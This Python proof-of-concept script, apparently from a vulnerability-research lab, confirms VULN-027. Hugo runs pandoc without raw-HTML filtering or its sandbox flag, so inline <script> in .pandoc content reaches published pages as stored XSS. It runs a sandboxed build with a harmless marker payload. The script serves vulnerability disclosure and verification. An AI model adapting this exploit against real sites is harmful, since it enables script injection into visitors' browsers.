#!/usr/bin/env python3
"""
VULN-027 — Pandoc content keeps raw_html enabled -> stored XSS
==============================================================

VULN-ID     : VULN-027
Title       : text/pandoc omitted from allowContent; pandoc run with no reader/sandbox flag (raw_html on)
Vuln file   : targets/hugo/config/security/securityConfig.go:86 (allowContent omits text/pandoc)
              targets/hugo/markup/pandoc/convert.go:71-76 (no -f/--sandbox -> default reader keeps raw_html)
CWE         : CWE-79 (stored XSS)

The flaw
--------
The Pandoc content format has no safety knob, `text/pandoc` is omitted from the
security.allowContent denylist, and Hugo invokes `pandoc` with only math/citeproc flags —
no `-f markdown-raw_html` and no `--sandbox`. So pandoc's default Markdown reader keeps the
`raw_html` extension enabled and emits inline `<script>` verbatim -> stored XSS. (Pandoc's
base Markdown has no file-include directive, so no default-config LFI — hence Medium.)

Enablement precondition: pandoc is not in the default security.exec.allow; the operator
installs pandoc and adds `^pandoc$`. This exploit uses the tools image (pandoc installed).

What a successful run proves
---------------------------
Untrusted .pandoc content emits a raw <script> into the published HTML (stored XSS).
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

VULN = "VULN-027"
IMAGE = "cvehunterlab_hugo_st10tools:latest"          # hugo + pandoc
XSS = "pandoc-xss-" + C.rand()


def main() -> int:
    C.banner(VULN, "Pandoc raw_html -> stored XSS",
             info="pandoc run with no -f/--sandbox; text/pandoc omitted from allowContent",
             target="throwaway `hugo` build (tools image: pandoc installed)")

    cfg = (
        "baseURL='http://localhost/'\ntitle='h27'\n"
        "disableKinds=['taxonomy','term','sitemap','rss','404']\n"
        "[security.exec]\n"
        "  allow = ['^(dart-)?sass$','^go$','^git$','^node$','^postcss$','^pandoc$']\n"
    )
    files = {
        "hugo.toml": cfg,
        "content/p.pandoc": f"Hi there <script>{XSS}</script>\n",
        "layouts/_default/single.html": "<!doctype html><body>{{ .Content }}</body>\n",
        "layouts/index.html": "home\n",
    }
    site = C.make_site(__file__, files)
    C.log("SETUP", f"content/p.pandoc contains inline <script>{XSS}</script>")

    C.log("STEP", "building with the tools image (pandoc on PATH, ^pandoc$ allowed)")
    rc, out, public = C.run_hugo(site, render_to_memory=False, network="none", memory="1g",
                                 timeout=90, image=IMAGE)
    page = os.path.join(public, "p", "index.html") if public else None
    html = open(page, encoding="utf-8").read() if page and os.path.isfile(page) else ""
    with open(os.path.join(os.path.dirname(__file__), "response.txt"), "w") as fh:
        fh.write(f"rc={rc}\n\n{html or out[-1500:]}")

    xss = f"<script>{XSS}</script>" in html
    C.log("PROOF", f"raw <script> emitted by pandoc's default reader (raw_html on): {xss}")

    if xss:
        C.log("OK", "exploit confirmed — pandoc's default Markdown reader passed the inline <script> "
                    "verbatim into the published HTML (raw_html enabled, no --sandbox). Stored XSS in every "
                    "reader's browser.")
        print(f"==> {VULN}: CONFIRMED — Pandoc raw_html stored XSS")
        return 0
    C.log("FAIL", f"raw <script> not emitted (rc={rc}); output:\n{(html or out)[-800:]}")
    print(f"==> {VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
